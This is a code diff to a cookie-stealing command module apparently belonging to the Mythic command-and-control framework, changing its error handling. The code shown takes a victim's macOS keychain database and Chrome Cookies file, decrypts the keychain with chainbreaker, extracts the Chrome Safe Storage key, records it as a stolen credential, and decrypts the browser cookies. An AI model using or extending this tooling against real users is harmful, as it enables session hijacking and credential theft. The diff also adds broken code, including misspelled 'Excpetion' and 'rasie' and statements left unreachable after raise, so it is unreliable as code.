@@ -71,8 +71,9 @@ class CookieThiefCommand(CommandBase):
         if getkeychainDBResp.status == "success":
             getkeychainDBResp = getkeychainDBResp.response[0]
         else:
-            print("Encountered an error attempting to get downloaded file: " + getkeychainDBResp.error)
-            sys.stdout.flush()
+            raise Exception("Encountered an error attempting to get downloaded file: " + getkeychainDBResp.error)
+            await MythicRPC().execute("Encountered an error attempting to get downloaded file: " + getkeychainDBResp.error)
+            task.status = MythicStatus.error
 
         ## Write the downloaded login.keychain-db file to a new file on disk
         try:
@@ -80,27 +81,27 @@ class CookieThiefCommand(CommandBase):
             f.write(base64.b64decode(getkeychainDBResp["contents"]))
             f.close()
         except Exception as e:
-            print("Encountered an error attempting to write the keychainDB to a file: " + str(e))
-            sys.stdout.flush()
+            raise Exception("Encountered an error attempting to write the keychainDB to a file: " + str(e))
+            await MythicRPC().execute("Encountered an error attempting to write the keychainDB to a file: " + str(e))
+            task.status = MythicStatus.error
 
         ## Decrypt Keychain and export keys to files
         try:
             subprocess.run(["python2", "/Mythic/mythic/chainbreaker/chainbreaker.py", "--password=" + password, "--export-generic-passwords", "tmp_login.keychain-db"])
             await MythicRPC().execute("create_output",task_id=task.id,output="Keychain Decrypted")
         except Exception as e:
-            print("Chainbreaker script failed with error: " + str(e))
-            sys.stdout.flush()
+            raise Exception("Chainbreaker script failed with error: " + str(e))
+            await MythicRPC().execute("Chainbreaker script failed with error: " + str(e))
+            task.status = MythicStatus.error
 
         ## Remove the login.keychain-db file from disk
         try:
             if os.path.isfile('/Mythic/mythic/tmp_login.keychain-db'):
                 os.remove('/Mythic/mythic/tmp_login.keychain-db')
             else:
-                print("Temp KeychainDB file does not exist.")
-                sys.stdout.flush()
+                raise Exception("Temp KeychainDB file does not exist to remove")
         except Exception as e:
-            print("Encountered an error attempting to remove the temporary keychainDB file: " + str(e))
-            sys.stdout.flush()
+            raise Excpetion("Encountered an error attempting to remove the temporary keychainDB file: " + str(e))
 
 
         ## parse the Chrome Safe Storage key from the coresponding keychain password dump file
@@ -109,8 +110,9 @@ class CookieThiefCommand(CommandBase):
         try:
             ccs_keyfile = open("/Mythic/mythic/passwords/generic/ChromeSafeStorage.txt", "r")
         except Exception as e:
-            print("Chrome Safe Storage key file failed to open with error: " + str(e))
-            sys.stdout.flush()
+            raise Exception("Chrome Safe Storage key file failed to open with error: " + str(e))
+            await MythicRPC().execute("Chrome Safe Storage key file failed to open with error: " + str(e))
+            task.status = MythicStatus.error
 
         for line in ccs_keyfile:
             if fndstr in line:
@@ -124,8 +126,8 @@ class CookieThiefCommand(CommandBase):
         try:
             shutil.rmtree("/Mythic/mythic/passwords")
         except Exception as e:
-            print("Failed to delete dumped keys directory with error: " + str(e))
-            sys.stdout.flush()
+            raise Exception("Failed to delete dumped keys directory with error: " + str(e))
+
 
         create_cred_resp = await MythicRPC().execute("create_credential",task_id=task.id,credential_type="plaintext",account="Chrome Safe Storage",realm="local",credential=ccs_password,metadata="",comment="Chrome Safe Storage Key")
         if create_cred_resp.status == MythicStatus.Success:
@@ -136,15 +138,17 @@ class CookieThiefCommand(CommandBase):
         if getCookiesResp.status == "success":
             getCookiesResp = getCookiesResp.response[0]
         else:
-            print("Encountered an error attempting to get downloaded file: " + getCookiesResp.error)
-            sys.stdout.flush()
+            raise Exception("Encountered an error attempting to get downloaded file: " + getCookiesResp.error)
+            await MythicRPC().execute("Encountered an error attempting to get downloaded file: " + getCookiesResp.error)
+            task.status = MythicStatus.error
         try:
             f = open("tmp_Cookies", "wb")
             f.write(base64.b64decode(getCookiesResp["contents"]))
             f.close()
         except Exception as e:
-            print("Encountered an error attempting to write the keychainDB to a file: " + str(e))
-            sys.stdout.flush()
+            raise Exception("Encountered an error attempting to write the keychainDB to a file: " + str(e))
+            await MythicRPC().execute("Encountered an error attempting to write the keychainDB to a file: " + str(e))
+            task.status = MythicStatus.error
 
         cookie_args = {"cookies_file":"/Mythic/mythic/tmp_Cookies", "key":ccs_password, "output":"cookies.json"}
 
@@ -168,10 +172,12 @@ class CookieThiefCommand(CommandBase):
                 else:
                     await MythicRPC().execute("create_output",task_id=task.id,output="No cookies found in Cookies file")
             else:
+                raise Exception("cookie.json file failed on creation")
                 await MythicRPC().execute("create_output",task_id=task.id,output="cookie.json file failed on creation")
         except Exception as e:
-            print("PyCookieCheat script failed with error: " + str(e))
-            sys.stdout.flush()
+            raise Exception("PyCookieCheat script failed with error: " + str(e))
+            await MythicRPC().execute("PyCookieCheat script failed with error: " + str(e))
+            task.status = MythicStatus.error
 
 
         # Remove the Cookies file from disk
@@ -179,17 +185,14 @@ class CookieThiefCommand(CommandBase):
             if os.path.isfile('/Mythic/mythic/tmp_Cookies'):
                 os.remove('/Mythic/mythic/tmp_Cookies')
             else:
-                print("Temp Cookies file does not exist.")
-                sys.stdout.flush()
+                raise Exception("Temp Cookies file does not exist.")
         except Exception as e:
-            print("Encountered an error attempting to remove the temporary Cookies file: " + str(e))
-            sys.stdout.flush()
+            rasie Exception("Encountered an error attempting to remove the temporary Cookies file: " + str(e))
 
         try:
             if os.path.isfile("cookies.json"):
                 os.remove("cookies.json")
         except Exception as e:
-            print("Encountered an error attempting to remove the cookies.json file: " + str(e))
-            sys.stdout.flush()
+            raise Exception("Encountered an error attempting to remove the cookies.json file: " + str(e))
 
         return task
